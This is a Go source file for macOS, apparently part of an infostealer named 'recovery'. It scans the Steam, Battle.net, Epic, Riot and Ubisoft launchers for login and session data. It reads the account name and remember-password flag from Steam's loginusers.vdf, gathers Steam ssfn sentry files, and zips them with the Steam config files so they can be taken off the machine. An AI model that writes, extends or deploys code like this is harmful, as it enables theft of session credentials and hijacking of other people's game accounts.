//go:build darwin

package recovery

import (
	"os"
	"path/filepath"
	"strings"

	"recovery/recovery/types"
	"recovery/recovery/ziputil"
)

func pathExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

func ScanGaming() *types.GamingResult {
	result := &types.GamingResult{
		Steam:     scanSteamDarwin(),
		BattleNet: scanBattleNetDarwin(),
		Epic:      scanEpicDarwin(),
		Riot:      scanRiotDarwin(),
		Uplay:     scanUplayDarwin(),
	}
	if result.Steam == nil && len(result.BattleNet) == 0 && len(result.Epic) == 0 &&
		len(result.Riot) == 0 && len(result.Uplay) == 0 {
		return nil
	}
	return result
}

func appSupportDir() string {
	home, _ := os.UserHomeDir()
	if home == "" {
		return ""
	}
	return filepath.Join(home, "Library", "Application Support")
}

func scanSteamDarwin() *types.SteamResult {
	steamPath := filepath.Join(appSupportDir(), "Steam")
	if !pathExists(steamPath) {
		return nil
	}

	result := &types.SteamResult{SteamPath: steamPath}

	configPath := filepath.Join(steamPath, "config", "loginusers.vdf")
	if data, err := os.ReadFile(configPath); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, `"AccountName"`) || strings.HasPrefix(line, `"accountname"`) {
				val := vdfValueDarwin(line)
				if val != "" {
					result.Account = val
					result.AutoLogin = val
				}
			}
			if strings.HasPrefix(line, `"RememberPassword"`) {
				result.RememberPW = vdfValueDarwin(line) == "1"
			}
		}
	}

	if entries, err := os.ReadDir(steamPath); err == nil {
		for _, e := range entries {
			if !e.IsDir() && strings.Contains(e.Name(), "ssfn") {
				result.SSFNFiles = append(result.SSFNFiles, e.Name())
			}
		}
	}

	seenGames := make(map[string]bool)
	scanSteamLibraryDarwin(steamPath, result, seenGames)

	if result.Account == "" && len(result.Games) == 0 && len(result.SSFNFiles) == 0 {
		return nil
	}
	return result
}

func scanSteamLibraryDarwin(steamPath string, result *types.SteamResult, seenGames map[string]bool) {
	libraryFolders := []string{steamPath}
	vdfPath := filepath.Join(steamPath, "steamapps", "libraryfolders.vdf")
	if data, err := os.ReadFile(vdfPath); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(strings.ToLower(line), `"path"`) {
				val := vdfValueDarwin(line)
				if val != "" && pathExists(val) && val != steamPath {
					libraryFolders = append(libraryFolders, val)
				}
			}
		}
	}

	for _, lib := range libraryFolders {
		libApps := filepath.Join(lib, "steamapps")
		if !pathExists(libApps) {
			continue
		}
		entries, _ := os.ReadDir(libApps)
		for _, e := range entries {
			if e.IsDir() || !strings.HasPrefix(e.Name(), "appmanifest_") || !strings.HasSuffix(e.Name(), ".acf") {
				continue
			}
			acfData, err := os.ReadFile(filepath.Join(libApps, e.Name()))
			if err != nil || len(acfData) == 0 {
				continue
			}
			acf := parseACFDarwin(string(acfData))
			if acf["appid"] == "" || acf["name"] == "" {
				continue
			}
			if !seenGames[acf["appid"]] {
				seenGames[acf["appid"]] = true
				result.Games = append(result.Games, types.GameInfo{
					ID:        acf["appid"],
					Name:      acf["name"],
					Installed: acf["StateFlags"] != "4",
				})
			}
		}
	}
}

func scanBattleNetDarwin() []types.BattleNetResult {
	bnDir := filepath.Join(appSupportDir(), "Battle.net")
	if !pathExists(bnDir) {
		return nil
	}
	var results []types.BattleNetResult
	scanBattleNetRecursiveDarwin(bnDir, &results)
	return results
}

func scanBattleNetRecursiveDarwin(dir string, results *[]types.BattleNetResult) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	for _, e := range entries {
		full := filepath.Join(dir, e.Name())
		if e.IsDir() {
			scanBattleNetRecursiveDarwin(full, results)
			continue
		}
		lower := strings.ToLower(e.Name())
		if strings.HasSuffix(lower, ".db") || strings.HasSuffix(lower, ".config") {
			*results = append(*results, types.BattleNetResult{Path: full, Name: e.Name()})
		}
	}
}

func scanEpicDarwin() []types.EpicResult {
	path := filepath.Join(appSupportDir(), "Epic", "EpicGamesLauncher", "Saved", "Config", "Mac", "GameUserSettings.ini")
	if !pathExists(path) {
		path = filepath.Join(appSupportDir(), "EpicGamesLauncher", "Saved", "Config", "Mac", "GameUserSettings.ini")
	}
	if !pathExists(path) {
		return nil
	}
	data, err := os.ReadFile(path)
	if err != nil || len(data) == 0 {
		return nil
	}
	content := string(data)
	if strings.Contains(content, "RememberMe") || strings.Contains(content, "Offline") {
		return []types.EpicResult{{Path: path, Name: "GameUserSettings.ini"}}
	}
	return nil
}

func scanRiotDarwin() []types.RiotResult {
	var results []types.RiotResult
	riotBase := filepath.Join(appSupportDir(), "Riot Games", "Riot Client")
	dataDir := filepath.Join(riotBase, "Data")
	if pathExists(dataDir) {
		results = append(results, types.RiotResult{Path: dataDir, Name: "RiotGamesPrivateSettings.yaml"})
	}
	configDir := filepath.Join(riotBase, "Config")
	if pathExists(configDir) {
		results = append(results, types.RiotResult{Path: configDir, Name: "Config"})
	}
	return results
}

func scanUplayDarwin() []types.UplayResult {
	path := filepath.Join(appSupportDir(), "Ubisoft Game Launcher")
	if !pathExists(path) {
		return nil
	}
	return []types.UplayResult{{Path: path, Name: "Ubisoft Game Launcher"}}
}

func parseACFDarwin(data string) map[string]string {
	result := map[string]string{}
	var inBlock bool
	for _, line := range strings.Split(data, "\n") {
		line = strings.TrimLeft(line, "\t ")
		if line == "{" {
			inBlock = true
			continue
		}
		if line == "}" {
			break
		}
		if !inBlock || line == "" {
			continue
		}
		if strings.HasPrefix(line, `"`) {
			key := vdfNthQuotedDarwin(line, 0)
			val := vdfNthQuotedDarwin(line, 1)
			if key != "" {
				result[key] = val
			}
		}
	}
	return result
}

func vdfValueDarwin(line string) string {
	return vdfNthQuotedDarwin(line, 1)
}

func vdfNthQuotedDarwin(line string, n int) string {
	count := 0
	i := 0
	for count <= n && i < len(line) {
		start := strings.Index(line[i:], `"`)
		if start == -1 {
			return ""
		}
		start += i + 1
		end := strings.Index(line[start:], `"`)
		if end == -1 {
			if count == n {
				return line[start:]
			}
			return ""
		}
		if count == n {
			return line[start : start+end]
		}
		i = start + end + 1
		count++
	}
	return ""
}

const maxZipFile = 50 * 1024 * 1024

func ZipSteamSession(steamPath string) ([]byte, error) {
	if steamPath == "" || !pathExists(steamPath) {
		return nil, os.ErrNotExist
	}

	var files []string
	entries, _ := os.ReadDir(steamPath)
	for _, e := range entries {
		if !e.IsDir() && strings.Contains(e.Name(), "ssfn") {
			if info, _ := e.Info(); info != nil && info.Size() < maxZipFile {
				files = append(files, filepath.Join(steamPath, e.Name()))
			}
		}
	}

	configDir := filepath.Join(steamPath, "config")
	for _, name := range []string{"loginusers.vdf", "config.vdf", "DialogConfig.vdf"} {
		p := filepath.Join(configDir, name)
		if pathExists(p) {
			files = append(files, p)
		}
	}

	if len(files) == 0 {
		return nil, os.ErrNotExist
	}
	return ziputil.ZipFiles(files, filepath.Dir(steamPath))
}